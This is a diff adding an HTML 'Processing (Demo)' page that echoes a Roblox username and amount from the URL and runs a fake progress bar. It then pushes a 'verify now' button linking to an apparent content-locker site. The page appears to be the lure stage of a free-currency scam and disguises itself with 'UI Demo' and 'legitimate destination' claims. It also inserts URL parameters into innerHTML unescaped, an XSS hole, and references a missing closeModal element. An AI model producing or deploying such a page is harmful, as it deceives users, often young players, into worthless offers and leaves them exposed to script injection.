@@ -1,0 +1,193 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Progress — UI Demo</title>
+  <style>
+    :root{
+      --bg:#070a12;
+      --card:#0e1422cc;
+      --card-border:#18233a;
+      --txt:#e9f0ff;
+      --muted:#9db3d9;
+      --accent1:#6bdcff;
+      --accent2:#7b5cff;
+      --accent3:#00ffa6;
+      --radius:18px;
+      --glass:rgba(255,255,255,.06);
+      --shadow:0 8px 40px rgba(0,0,0,.35);
+    }
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0; font-family: ui-sans-serif,system-ui,-apple-system,Segoe UI,Roboto,Inter,Arial;
+      color:var(--txt);
+      background:
+        radial-gradient(1200px 600px at 10% -10%, #1a2440 0%, transparent 60%),
+        radial-gradient(900px 500px at 110% 10%, #0f2744 0%, transparent 60%),
+        linear-gradient(180deg, #06080f, #0a0f1b 60%, #06080f);
+      overflow-x:hidden;
+    }
+    .wrap{min-height:100dvh; display:grid; place-items:center; padding:28px;}
+    .card{
+      width:min(840px, 96vw);
+      background:linear-gradient(180deg, #0b1222ad, #0b122290), var(--glass);
+      border:1px solid var(--card-border);
+      border-radius: var(--radius);
+      box-shadow: var(--shadow); padding:28px; position:relative; overflow:hidden;
+      backdrop-filter: blur(10px);
+    }
+    .h1{ font-size: clamp(22px, 2vw + 10px, 36px); margin:4px 0 4px 0 }
+    .muted{ color:var(--muted) }
+    .row{ display:flex; gap:14px; flex-wrap:wrap; align-items:center; margin:8px 0 16px 0 }
+    .tag{
+      border:1px solid #1c2a49; padding:.45rem .75rem; border-radius:999px; background:#0c1428; color:#cfe0ff;
+      font-weight:700; letter-spacing:.2px;
+    }
+
+    .bar-wrap{
+      margin-top:14px; border:1px solid #203158; border-radius:12px; padding:8px;
+      background:linear-gradient(180deg, #0f1730, #0c1324);
+    }
+    .bar{
+      height:16px; border-radius:10px; width:0%;
+      background: linear-gradient(90deg, var(--accent1), var(--accent2), var(--accent3));
+      box-shadow: 0 10px 24px #00ffa63a;
+      transition: width .12s ease;
+    }
+    .pct{ text-align:right; color:#cfe0ff; margin-top:6px; font-weight:800; letter-spacing:.3px }
+
+    .foot{
+      display:flex; justify-content:space-between; align-items:center; gap:12px; flex-wrap:wrap; margin-top:16px;
+      color:#a9bcea;
+    }
+
+    /* Modal */
+    .modal{
+      position:fixed; inset:0; display:none; place-items:center; padding:18px;
+      background: rgba(4,6,12,.55); backdrop-filter: blur(6px);
+    }
+    .modal.show{ display:grid }
+    .modal-card{
+      width:min(560px, 96vw); border-radius:16px; overflow:hidden; border:1px solid #1e2b4e;
+      background:linear-gradient(180deg, #0d142b, #0a1022);
+      box-shadow: var(--shadow);
+      animation: pop .18s ease-out 1;
+    }
+    @keyframes pop{ from{ transform:scale(.94); opacity:.4 } to{ transform:scale(1); opacity:1 } }
+    .modal-head{ padding:18px 18px 10px 18px; display:flex; align-items:center; gap:10px }
+    .modal-head h3{ margin:0; font-size:1.2rem }
+    .modal-body{ padding:0 18px 18px 18px; color:#cfe0ff }
+    .modal-actions{ padding:0 18px 18px 18px; display:flex; justify-content:flex-end; gap:10px }
+    .btn{ border:none; cursor:pointer; padding:12px 16px; border-radius:12px; font-weight:900; letter-spacing:.3px; }
+    .btn-ghost{ background:transparent; color:#cfe0ff; border:1px solid #243459 }
+    .btn-primary{
+      color:#071018; background:linear-gradient(90deg, var(--accent1), var(--accent2), var(--accent3));
+      box-shadow: 0 12px 30px #00ffa633;
+    }
+    a.btn-primary{ text-decoration:none; display:inline-block }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="card" role="region" aria-label="Progress screen">
+      <div class="row">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+          <path d="M12 2l9 5v10l-9 5-9-5V7l9-5z" stroke="#6bdcff" stroke-width="1.4"/>
+          <circle cx="12" cy="12" r="3.4" fill="#7b5cff"/>
+        </svg>
+        <h1 class="h1">Processing (Demo)</h1>
+      </div>
+      <p class="muted">A short demo timer to illustrate a “checking” step in a flow. Nothing is sent externally.</p>
+
+      <div class="row" id="info">
+        <span class="tag" id="userTag">User: —</span>
+        <span class="tag" id="amtTag">Selected: —</span>
+      </div>
+
+      <div class="bar-wrap" aria-label="Progress bar">
+        <div class="bar" id="bar"></div>
+        <div class="pct" id="pct">0%</div>
+      </div>
+
+      <div class="foot">
+        <span>Duration: ~6 seconds</span>
+        <span>UI Demo • No affiliation with Roblox</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal -->
+  <div class="modal" id="modal">
+    <div class="modal-card" role="dialog" aria-modal="true" aria-labelledby="modalTitle">
+      <div class="modal-head">
+        <svg width="22" height="22" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+          <circle cx="12" cy="12" r="10" stroke="#ffd15c" stroke-width="1.6"/>
+          <path d="M12 7v6" stroke="#ffd15c" stroke-width="1.6" stroke-linecap="round"/>
+          <circle cx="12" cy="16.5" r="1.2" fill="#ffd15c"/>
+        </svg>
+        <h3 id="modalTitle">Next step required</h3>
+      </div>
+      <div class="modal-body">
+        <p id="modalText">To continue, please verify.</p>
+      </div>
+      <div class="modal-actions">
+
+        <a class="btn btn-primary" id="proceedBtn" href="#" target="_blank" rel="noopener">verify now</a>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ===== Config: put your link here (transparent, legitimate destination) =====
+    const PROCEED_URL = "https://areyourealhuman.com/cl/i/kld99l"; // <= CHANGE ME
+
+    // Parse query params
+    const params = new URLSearchParams(window.location.search);
+    const name = (params.get('u') || '').trim();
+    const amount = (params.get('a') || '').trim();
+
+    const userTag = document.getElementById('userTag');
+    const amtTag  = document.getElementById('amtTag');
+
+    if(!name || !amount){
+      // back to form if missing
+      window.location.replace('index.html');
+    } else {
+      userTag.textContent = `User: ${name}`;
+      amtTag.textContent  = `Selected: ${Number(amount).toLocaleString()}`;
+    }
+
+    // Progress logic (6 seconds)
+    const bar = document.getElementById('bar');
+    const pct = document.getElementById('pct');
+    const modal = document.getElementById('modal');
+    const closeModal = document.getElementById('closeModal');
+    const proceedBtn = document.getElementById('proceedBtn');
+
+    proceedBtn.href = PROCEED_URL;
+
+    const DURATION = 6000; // ms
+    const start = performance.now();
+
+    function step(now){
+      const t = Math.min(1, (now - start) / DURATION);
+      const percent = Math.round(t * 100);
+      bar.style.width = percent + '%';
+      pct.textContent = percent + '%';
+      if(t < 1){
+        requestAnimationFrame(step);
+      } else {
+        // Show modal
+        modal.classList.add('show');
+        document.getElementById('modalText').innerHTML =
+          `Username: <strong>${name}</strong> • Selected: <strong>${Number(amount).toLocaleString()}</strong>`;
+      }
+    }
+    requestAnimationFrame(step);
+
+    closeModal.addEventListener('click', ()=> modal.classList.remove('show'));
+  </script>
+</body>
+</html>
